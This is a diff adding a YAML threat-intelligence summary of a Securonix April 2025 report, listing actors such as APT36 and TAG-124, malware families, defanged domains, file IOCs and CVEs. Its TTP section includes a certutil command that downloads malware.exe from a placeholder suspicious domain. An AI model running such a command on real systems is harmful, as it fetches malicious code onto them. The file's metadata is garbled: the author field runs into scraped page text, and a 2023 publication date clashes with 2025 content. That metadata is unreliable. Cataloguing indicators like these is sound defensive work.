@@ -1,0 +1,123 @@
+description: 'The report details various cyber threats, including malware families
+  like XorDDoS and StealC,
+
+  targeting sectors such as Industrial and Legal. It also highlights threat actors
+  TAG-124 and SocGholish.
+
+  '
+attribution:
+- APT36 (Transparent Tribe, Pakistan-linked)
+- UNC5174
+- UNC5221
+- Sapphire Werewolf
+- Gamaredon
+- ShadowPad/RedFoxtrot
+- Storm-0249
+- UNC5837
+- Storm-2460
+- TAG-124
+- SocGholish
+malware_families:
+- Crimson RAT
+- VShell RAT
+- Amethyst Stealer
+- BRICKSTORM
+- SNOWLIGHT (dropper)
+- Sliver implant
+- ShadowPad
+- Latrodectus loader
+- AHKBot Looper
+- Remcos RAT
+- PE32 Ransomware
+- XorDDoS Trojan
+- MintsLoader
+- GhostWeaver RAT
+- StealC infostealer
+- Linux-based DDoS Malware
+- VIP Version XorDDoS
+- GhostWeaver
+- StealC
+- Modified BOINC client
+- AsyncRAT
+TTPs:
+  processes:
+  - jnmxrvt hcsm.exe
+  - WEISTT.jpg
+  - kworker/0:2
+  - download_backd.sh
+  - dnsloger
+  - system_worker
+  - - kworker/0:2
+  - msimg32.dll
+  - Packagec.ps1
+  - bb.exe
+  - crazyhunter.exe
+  - crazyhunter.sys
+  - ru.bat
+  - go*.exe
+  - SharpGPOAbuse (gpo.exe)
+  commandline:
+  - certutil -urlcache -split -f http[:]//<suspicious-domain>/malware.exe
+  powershell: []
+  scripting_engine:
+  - download_backd.sh
+  registry_keys: []
+  image_load:
+  - msimg32.dll
+  network_connections:
+  - mstsc.exe
+  file_activity:
+  - C:\\jnmhxrv cstm\\jnmhxrv cstm\\obj\\Debug\\jnmhxrv cstm.pdb
+  - C:\\Users\\Public\\bb2.zip
+  - C:\\ProgramData\\SkyPDF\\PDUDrv.blf
+  persistence:
+  - crontab
+  pipes: []
+  process_relations: []
+IOCs:
+- jnmhxrvt hcsm.exe
+- WEISTT.jpg
+- gooogleasia[.]com
+- sex666vr[.]com
+- Dvx.zip
+- msimg32.dll
+- Packagec.ps1
+- bb2.zip
+- crazyhunter.exe
+- crazyhunter.sys
+- ru.bat
+- go*.exe
+- SharpGPOAbuse (gpo.exe)
+- Irs_Verification_Form.pdf
+- shareddocumentso365cloudauthstorage[.]com
+- Tax_Refund_Eligibility_Document[.]xlsm
+- AutoNotify.ahk
+- GuLoader executable
+- Remcos RAT
+- PE32-KEY folder
+- context.pe32c
+- lock.pe32
+- pe32lockfile.lock
+- .pe32s encryption files
+- README.txt
+- ntdll.dll
+- kernel32.dll
+- crypt32.dll
+- bcrypt.dll
+- schannel.dll
+- CVE-2025-31324
+- CVE-2025-29824
+- CVE-2025-31161
+- XorDDoS Trojan
+- MintsLoader
+- GhostWeaver RAT
+- StealC infostealer
+- 400 IoCs available on Threat Labs home page repository
+authors:
+- Dheeraj Kumar
+- Sina Chehreghani
+- Nitish Singh
+- Nikhil Kumar Chadhasecuroni Securonix Agentic AlA New Era of Al-Powered SecOps
+reference: https://www.securonix.com/blog/securonix-threat-labs-monthly-intelligence-insights-april-2025/
+date_of_publication: June 08, 2023
+file_creation_date: July 28, 2025
